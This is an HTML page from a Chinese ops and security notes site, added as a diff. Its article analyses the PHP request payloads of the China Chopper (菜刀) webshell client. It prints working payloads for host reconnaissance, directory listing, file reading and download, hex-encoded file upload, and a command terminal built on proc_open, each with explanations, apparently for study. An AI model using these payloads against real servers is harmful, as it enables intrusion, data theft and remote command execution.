@@ -1,0 +1,265 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <title>菜刀 源代码分析｜安全与堡垒机 / 安全运维｜BEN.OPS</title>
+  <meta name="description" content="菜刀 源代码分析。本文属于安全与堡垒机 / 安全运维，1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 4…">
+  <meta name="keywords" content="安全与堡垒机，安全运维，Linux，PHP，权限管理，知识笔记，安全与堡垒机 / 安全运维，菜刀 源代码分析">
+  <meta name="author" content="BEN">
+  <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+  <meta name="googlebot" content="index,follow,max-snippet:-1,max-image-preview:large">
+  <meta name="baiduspider" content="index,follow">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <link rel="canonical" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ec888266da4a.html">
+  <link rel="alternate" hreflang="zh-CN" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ec888266da4a.html">
+  <link rel="alternate" type="text/markdown" href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141557-%E5%AE%89%E5%85%A8%E4%B8%8E%E5%A0%A1%E5%9E%92%E6%9C%BA%2B%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%2BLinux%2BPHP-%E8%8F%9C%E5%88%80%20%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.md">
+  <link rel="alternate" type="application/rss+xml" title="BEN.OPS RSS" href="https://ben2023niao.github.io/ben-ops-notes/assets/rss.xml">
+  <link rel="alternate" type="application/xml" title="BEN.OPS Sitemap" href="https://ben2023niao.github.io/ben-ops-notes/assets/sitemap.xml">
+  <link rel="author" href="https://t.me/Ben_Bird">
+  <meta property="og:type" content="article">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:site_name" content="BEN.OPS 工程笔记">
+  <meta property="og:title" content="菜刀 源代码分析">
+  <meta property="og:description" content="菜刀 源代码分析。本文属于安全与堡垒机 / 安全运维，1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 4…">
+  <meta property="og:url" content="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ec888266da4a.html">
+  <meta property="article:published_time" content="2023-04-14T15:57:00">
+  <meta property="article:modified_time" content="2023-04-14 15:57">
+  <meta property="article:section" content="安全与堡垒机 / 安全运维">
+  <meta property="article:author" content="https://t.me/Ben_Bird">
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="菜刀 源代码分析">
+  <meta name="twitter:description" content="菜刀 源代码分析。本文属于安全与堡垒机 / 安全运维，1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 4…">
+  
+  <style>:root{color-scheme:light dark;--bg:#f4f0e8;--panel:#fffdf8;--bg2:#e8e1d6;--fg:#202621;--muted:#66736b;
+--line:#d4cbbd;--accent:#176b55;--accent2:#0b6094;--code:#17211d;--codefg:#d8f0e4;--warn:#9b5c12;
+--max:1120px}@media(prefers-color-scheme:dark){:root{--bg:#111713;--panel:#18201b;--bg2:#202b24;
+--fg:#dce9df;--muted:#9aad9f;--line:#314238;--accent:#67d4ad;--accent2:#76b9df;--code:#0a100d;
+--codefg:#cceadd;--warn:#f0b35c}}*{box-sizing:border-box}html{scroll-behavior:smooth;background:var(--bg)}
+body{margin:0;background:radial-gradient(circle at 15% 0,color-mix(in srgb,var(--accent) 8%,transparent),transparent 32rem),var(--bg);
+color:var(--fg);font:16px/1.82 ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif}
+a{color:var(--accent);text-underline-offset:.22em}a:hover{color:var(--accent2)}.shell{width:min(var(--max),calc(100% - 32px));margin:auto}
+.topbar{position:sticky;top:0;z-index:5;border-bottom:1px solid var(--line);background:color-mix(in srgb,var(--bg) 88%,transparent);
+backdrop-filter:blur(14px)}.topbar .shell{min-height:62px;display:flex;align-items:center;gap:18px}.brand{font:700 1rem/1 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--fg);text-decoration:none;letter-spacing:.04em}.brand b{color:var(--accent)}.topbar nav{margin-left:auto;display:flex;gap:16px;flex-wrap:wrap;font-size:.9rem}
+main{padding:34px 0 64px}.crumbs{font-size:.84rem;color:var(--muted);margin-bottom:18px}.hero{border:1px solid var(--line);background:var(--panel);
+border-radius:16px;padding:clamp(20px,4vw,42px);box-shadow:0 16px 50px #0000000a}.eyebrow{font:700 .74rem/1.2 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--accent);letter-spacing:.12em;text-transform:uppercase}.hero h1{font-size:clamp(1.8rem,4.4vw,3.2rem);line-height:1.2;margin:.55rem 0 1rem;
+letter-spacing:-.025em;overflow-wrap:anywhere}.lede{font-size:1.04rem;color:var(--muted);max-width:75ch;margin:0 0 18px}.meta{display:flex;flex-wrap:wrap;gap:8px}
+.badge{display:inline-flex;align-items:center;border:1px solid var(--line);border-radius:999px;padding:.22rem .68rem;background:var(--bg2);
+font-size:.78rem;color:var(--fg);text-decoration:none}.layout{margin-top:24px;display:grid;grid-template-columns:minmax(0,1fr) 260px;gap:24px;align-items:start}
+.article,.aside-box,.seo-summary{border:1px solid var(--line);background:var(--panel);border-radius:14px}.article{padding:clamp(20px,4vw,48px);min-width:0}
+.article h1,.article h2,.article h3,.article h4{line-height:1.35;letter-spacing:-.012em;scroll-margin-top:80px}.article h2{margin-top:2.2em;padding-top:.6em;
+border-top:1px solid var(--line)}.article h1{display:none}.article img{display:block;max-width:100%;height:auto;margin:1.4rem auto;border-radius:8px}
+.article pre{overflow:auto;background:var(--code);color:var(--codefg);padding:16px;border-radius:9px;line-height:1.6}
+.article code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.9em}.article :not(pre)>code{background:var(--bg2);padding:.12em .34em;border-radius:4px}
+.article table{display:block;max-width:100%;overflow:auto;border-collapse:collapse}.article th,.article td{border:1px solid var(--line);padding:.45rem .65rem}
+.article blockquote{margin:1.4rem 0;padding:.4rem 1rem;border-left:4px solid var(--accent);background:var(--bg2);color:var(--muted)}
+.article hr{border:0;border-top:1px solid var(--line);margin:2rem 0}.aside{position:sticky;top:82px;display:grid;gap:14px}
+.aside-box{padding:16px}.aside-box h2{font-size:.83rem;margin:0 0 12px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.aside-box ol,.aside-box ul{margin:0;padding-left:1.15rem}.aside-box li{margin:.5rem 0;font-size:.9rem}.aside-box a{text-decoration:none}
+.seo-summary{margin-top:24px;padding:20px 24px}.seo-summary h2{font-size:1rem;margin:0 0 .65rem}.seo-summary p{margin:0;color:var(--muted)}
+.pager{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}.pager a{border:1px solid var(--line);border-radius:12px;
+padding:14px 16px;background:var(--panel);text-decoration:none}.pager a:last-child{text-align:right}.pager small{display:block;color:var(--muted)}
+footer{padding:28px 0 48px;border-top:1px solid var(--line);color:var(--muted);font-size:.88rem}footer .shell{display:flex;gap:16px;flex-wrap:wrap}
+.index-hero h1{font-size:clamp(2.1rem,6vw,4.4rem)}.stat-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-top:20px}
+.stat{border:1px solid var(--line);background:var(--bg2);border-radius:10px;padding:12px}.stat strong{display:block;font:700 1.35rem/1.2 ui-monospace,monospace}
+.stat span{font-size:.78rem;color:var(--muted)}.year{margin-top:34px}.year>h2{position:sticky;top:62px;z-index:2;margin:0;padding:12px 0;
+background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(8px);font:700 1.25rem/1.2 ui-monospace,monospace}
+.cards{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}.card{border:1px solid var(--line);background:var(--panel);border-radius:12px;padding:18px}
+.card h3{font-size:1.02rem;line-height:1.45;margin:.35rem 0 .55rem}.card h3 a{text-decoration:none}.card p{margin:.45rem 0;color:var(--muted);font-size:.87rem}
+.card .date{font:600 .77rem/1 ui-monospace,monospace;color:var(--accent)}.tags{display:flex;flex-wrap:wrap;gap:5px}.tag{font-size:.72rem;color:var(--muted);border:1px solid var(--line);
+border-radius:99px;padding:.12rem .48rem}@media(max-width:860px){.layout{grid-template-columns:1fr}.aside{position:static;grid-row:1}.cards{grid-template-columns:1fr}}
+@media(max-width:620px){body{font-size:15px}.shell{width:min(100% - 22px,var(--max))}.topbar nav{gap:10px;font-size:.8rem}.hero,.article{padding:18px}
+.meta{gap:6px}.stat-grid{grid-template-columns:repeat(2,1fr)}.pager{grid-template-columns:1fr}.pager a:last-child{text-align:left}}
+@media print{.topbar,.aside,.pager,footer{display:none}.shell{width:100%}.article,.hero{border:0;box-shadow:none;padding:0}}</style>
+  <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","@id":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ec888266da4a.html#article","headline":"菜刀 源代码分析","description":"菜刀 源代码分析。本文属于安全与堡垒机 / 安全运维，1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 4…","datePublished":"2023-04-14T15:57:00","dateModified":"2023-04-14 15:57","inLanguage":"zh-CN","articleSection":["安全与堡垒机","安全运维"],"keywords":["安全与堡垒机","安全运维","Linux","PHP","权限管理","知识笔记","安全与堡垒机 / 安全运维","菜刀 源代码分析"],"wordCount":1057,"mainEntityOfPage":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ec888266da4a.html","url":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ec888266da4a.html","author":{"@type":"Person","name":"BEN","url":"https://t.me/Ben_Bird"},"publisher":{"@type":"Organization","name":"BEN.OPS 工程笔记","url":"https://ben2023niao.github.io/ben-ops-notes/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"BEN.OPS 工程笔记","item":"https://ben2023niao.github.io/ben-ops-notes/"},{"@type":"ListItem","position":2,"name":"安全与堡垒机 / 安全运维","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html"},{"@type":"ListItem","position":3,"name":"菜刀 源代码分析","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ec888266da4a.html"}]}]}</script>
+</head>
+<body>
+  <header class="topbar"><div class="shell">
+    <a class="brand" href="https://ben2023niao.github.io/ben-ops-notes/"><b>$_</b> BEN.OPS</a>
+    <nav aria-label="站点导航">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">交互知识库</a>
+      <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">静态文章索引</a>
+      <a href="https://t.me/Ben_Bird">@Ben_Bird</a>
+    </nav>
+  </div></header>
+  <main class="shell">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">首页</a> › <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">工程笔记</a>
+      › <span>安全与堡垒机 / 安全运维</span> › <span>菜刀 源代码分析</span>
+    </nav>
+    <header class="hero">
+      <div class="eyebrow">安全与堡垒机 / 安全运维</div>
+      <h1>菜刀 源代码分析</h1>
+      <p class="lede">菜刀 源代码分析。本文属于安全与堡垒机 / 安全运维，1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 4…</p>
+      <div class="meta">
+        <time class="badge" datetime="2023-04-14T15:57:00">发布于 2023-04-14</time>
+        <span class="badge">作者 BEN</span>
+        <span class="badge">1,057 字</span>
+        <span class="badge">4 分钟阅读</span>
+      </div>
+    </header>
+    <div class="layout">
+      <article class="article" itemscope itemtype="https://schema.org/TechArticle">
+        
+<pre><code>请求包一
+@ini_set("display_errors", "0");@set_time_limit(0);
+if (PHP_VERSION &lt; '5.3.0') {@set_magic_quotes_runtime(0);
+};
+echo("X@Y");
+$D = dirname(__FILE__);
+$R = "{$D}\t";
+if (substr($D, 0, 1) != "/") {
+    foreach(range("A", "Z") as $L) if (is_dir("{$L}:")) $R. = "{$L}:";
+}
+$R. = "\t";
+$u = (function_exists('posix_getegid')) ? @posix_getpwuid(@posix_geteuid()) : '';
+$usr = ($u) ? $u['name'] : @get_current_user();
+$R. = php_uname();
+$R. = "({$usr})";
+print $R;;
+echo("X@Y");
+die();
+@ ini_set(“display_errors”, “0”)关闭PHP的错误显示
+@set_time_limit(0) 设置程序的执行时间，应该是为了放在上传文件，执行命令回显超时等问题。
+if (PHP_VERSION &lt; ‘5.3.0’) {@set_magic_quotes_runtime(0);};版本大于5.3.0就关闭，当传输的POST或者get数据存在反斜杆（\）、单引号（’）、双引号（”）等特殊字符是就自动加上(斜杠)。
+echo(“X@Y”);用于反caidao返回数据的中定位用的，如X@Y12345X@Y,那么caidao就读出内容为12345,
+if (substr($D, 0, 1) != “/“) {
+foreach(range(“A”, “Z”) as $L) if (is_dir(“{$L}:”)) $R. = “{$L}:”;
+}
+获取网站的绝对路径以及存在多少个盘.
+$u = (function_exists(‘posix_getegid’)) ? @posix_getpwuid(@posix_geteuid())
+获取当前进程的用户名，这个好像posix_geteuid()好像只有在linux下才有效
+$usr = ($u) ? $u[‘name’] : @get_current_user();
+获取执行脚本权限的用户名，比如www，system。
+php_uname();返回了运行 PHP 的操作系统的描述
+##请求包二
+@ini_set("display_errors", "0");@set_time_limit(0);
+if (PHP_VERSION &lt; '5.3.0') {@set_magic_quotes_runtime(0);
+};
+echo("X@Y");
+$D = 'D:\\www\\security\\';
+$F = @opendir($D);
+if ($F == NULL) {
+    echo("ERROR:// Path Not Found Or No Permission!");
+} else {
+    $M = NULL;
+    $L = NULL;
+    while ($N = @readdir($F)) {
+        $P = $D.'/'.$N;
+        $T = @date("Y-m-d H:i:s", @filemtime($P));@$E = substr(base_convert(@fileperms($P), 10, 8), -4);
+        $R = "\t".$T."\t".@filesize($P)."\t".$E."\n";
+        if (@is_dir($P)) $M. = $N."/".$R;
+        else $L. = $N.$R;
+    }
+    echo $M.$L;@closedir($F);
+};
+echo("X@Y");
+die();
+@date(“Y-m-d H:i:s”, @filemtime($P));
+获取“D:\www\security\”下的文件时间
+@$E = substr(base_convert(@fileperms($P), 10, 8), -4)
+文件权限以八进制的形式进行返回 如0777，0666
+读取文件
+@ini_set("display_errors", "0");@set_time_limit(0);
+if (PHP_VERSION &lt; '5.3.0') {@set_magic_quotes_runtime(0);
+};
+echo("X@Y");
+$F = 'D:\\www\\security\\2008.php';
+$P = @fopen($F, 'r');
+echo(@fread($P, filesize($F)));@fclose($P);;
+echo("X@Y");
+die();
+$P = @fopen($F, ‘r’);
+echo(@fread($P, filesize($F)));@fclose($P);;
+打开需要读取的文件，获取文件大小然后进行读取，读取完成后关闭打开的文件
+文件下载
+@ini_set("display_errors", "0");@set_time_limit(0);
+if (PHP_VERSION &lt; '5.3.0') {@set_magic_quotes_runtime(0);
+};
+echo("X@Y");
+$F = "D:\\www\\security\\2008.php";
+$fp = @fopen($F, 'r');
+if (@fgetc($fp)) {@fclose($fp);@readfile($F);
+} else {
+    echo('ERROR:// Can Not Read');
+};
+echo("X@Y");
+die();
+使用fgetc（）函数判断文件是不是空的，是空的话跳过，不是空则用@readfile()进行读取并且下载
+文件上传
+@ini_set("display_errors", "0");@set_time_limit(0);
+if (PHP_VERSION &lt; '5.3.0') {@set_magic_quotes_runtime(0);
+};
+echo("X@Y");
+$f = 'D:\\www\\security\\php.php';
+$c = $_POST["z1"];
+$c = str_replace("\r", "", $c);
+$c = str_replace("\n", "", $c);
+$buf = "";
+for ($i = 0; $i &lt; strlen($c); $i += 2) $buf. = urldecode('%'.substr($c, $i, 2));
+echo(@fwrite(fopen($f, 'w'), $buf) ? '1': '0');;
+echo("X@Y");
+die();
+&amp;z1=6161
+for ($i = 0; $i &lt; strlen($c); $i += 2) $buf. = urldecode(‘%’.substr($c, $i, 2));
+echo(@fwrite(fopen($f, ‘w’), $buf) ? ‘1’: ‘0’);
+&amp;z1=6161的值为16进制编码，把文件上次内容进行16进制编码然后使用urldecode进行16进制的解码，然后写入文件.
+虚拟终端
+@ini_set("display_errors", "0");@set_time_limit(0);
+if (PHP_VERSION &lt; '5.3.0') {@set_magic_quotes_runtime(0);
+};
+echo("X@Y");
+$m = get_magic_quotes_gpc();
+$p = 'cmd';
+$s = 'cd /d D:\\www\\security\\&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]';
+$d = dirname($_SERVER["SCRIPT_FILENAME"]);
+$c = substr($d, 0, 1) == "/" ? "-c \"{$s}\"": "/c \"{$s}\"";
+$r = "{$p} {$c}";
+$array = array(array("pipe", "r"), array("pipe", "w"), array("pipe", "w"));
+$fp = proc_open($r." 2&gt;&amp;1", $array, $pipes);
+$ret = stream_get_contents($pipes[1]);
+proc_close($fp);
+print $ret;;
+echo("X@Y");
+die();
+dirname($_SERVER[“SCRIPT_FILENAME”]获取当前可执行脚本的路径部分，如echo dirname(“C:/testweb/home.php”); 返回C:/testweb/
+$c = substr($d, 0, 1) == “/“ ? “-c "{$s}"“: “/c "{$s}"“;判断获取到的路径是不是/开头的如果是则执行 /bin/sh -c “whoami”如果不是则会执行cmd /c “whoami”
+/bin/sh 一般为/bin/
+/bin/sh 相当于 /bin/bash –posix
+/bin/sh -c “参数”如何不加-c参数，则shell会进入一个交互式的shell
+Cmd /c “参数”执行完指定命令后然后终止
+</code></pre>
+      </article>
+      <aside class="aside">
+        
+        <div class="aside-box"><h2>文章信息</h2><ul>
+          <li>分类：安全与堡垒机 / 安全运维</li>
+          <li>日期：2023-04-14</li>
+          <li>标签：<span class="tag">安全与堡垒机</span><span class="tag">安全运维</span><span class="tag">Linux</span><span class="tag">PHP</span><span class="tag">权限管理</span><span class="tag">知识笔记</span></li>
+          <li><span>来源：03-安全运营与应急/07-工作运维离线知识库/04-安全运维/birdben/68657860.html</span></li><li><a href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141557-%E5%AE%89%E5%85%A8%E4%B8%8E%E5%A0%A1%E5%9E%92%E6%9C%BA%2B%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%2BLinux%2BPHP-%E8%8F%9C%E5%88%80%20%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.md" type="text/markdown">查看 Markdown 原文</a></li>
+        </ul></div>
+        <div class="aside-box"><h2>作者</h2>
+          <p><a href="https://t.me/Ben_Bird">@Ben_Bird</a></p>
+          <p>Linux / DevOps / SRE / 云平台 / 安全运维</p>
+        </div>
+      </aside>
+    </div>
+    <section class="seo-summary" aria-labelledby="seo-summary-title">
+      <h2 id="seo-summary-title">文章摘要</h2>
+      <p>菜刀 源代码分析。本文属于安全与堡垒机 / 安全运维，1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 4…</p>
+      <p>关键词：安全与堡垒机、安全运维、Linux、PHP、权限管理、知识笔记、安全与堡垒机 / 安全运维、菜刀 源代码分析</p>
+    </section>
+    <nav class="pager" aria-label="文章翻页"><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ba10da1cfe30.html"><small>上一篇</small>获取百度相关搜索关键词</a><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-0761c7756d17.html"><small>下一篇</small>菜单脚本</a></nav>
+  </main>
+  <footer><div class="shell">
+    <span>© 2026 BEN.OPS</span>
+    <a href="https://github.com/ben2023niao/ben-ops-notes">GitHub</a>
+    <a href="https://t.me/Ben_Bird">Telegram @Ben_Bird</a>
+    <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ec888266da4a.html">本页永久链接</a>
+  </div></footer>
+</body>
+</html>
